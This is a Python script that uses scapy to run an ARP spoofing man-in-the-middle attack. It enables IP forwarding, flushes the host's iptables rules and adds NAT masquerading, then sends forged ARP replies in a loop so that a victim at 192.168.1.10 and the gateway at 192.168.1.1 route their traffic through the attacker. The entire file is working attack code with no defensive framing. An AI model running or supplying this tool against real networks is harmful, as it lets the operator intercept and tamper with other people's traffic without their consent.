#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
from threading import Thread
import subprocess
import signal
import sys

conf.iface='eth0'
thrds = []

def forward_ip(enabled=True):
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fw:
        #make sure traffic can flow through the machine
        if enabled:
            val = '1'
            os.system("/sbin/iptables -F")
            os.system("/sbin/iptables -X")
            os.system("/sbin/iptables -A FORWARD --in-interface eth0 -j ACCEPT")
            os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
        #Resume normal traffic
        else:
            val = '0'
            os.system("/sbin/iptables -F")
            os.system("/sbin/iptables -X")
            os.system("/sbin/iptables -t nat -F")
            os.system("/sbin/iptables -t nat -X")
        ret = subprocess.Popen(['echo', val], stdout=fw)
        if ret == 1:
            logging.error('ERROR SETTING IP FORWARDING')
            sys.exit(1)

#Creates ARP packets and sends them out
def spoof(victim, gateway):
    packet = ARP()
    packet.psrc = gateway
    packet.pdst = victim

    packet2 = ARP()
    packet2.psrc = victim
    packet2.pdst = gateway

    print("Spoofing: {0}".format(packet.pdst))
    try:
        while True:
            send(packet, verbose=0)
            send(packet2, verbose=0)
            sleep(5)
    except:
        pass

def main():
    global thrds
    base = '192.168.1.'
    router = base + '1'
    targets = map(lambda x: base + str(x), [10])

    forward_ip()

    #Create a thread for each IP in the targets
    for ip in targets:
        t = Thread(target=spoof, args=(ip,router,))
        thrds.append(t)
        t.start()

    for x in thrds:
        x.join()


if __name__ == '__main__':
    logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)
    if os.geteuid() != 0:
        logging.error("[-] You must be root")
        sys.exit(1)

    def signal_handler(signal, frame):
        forward_ip(False)
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    main()
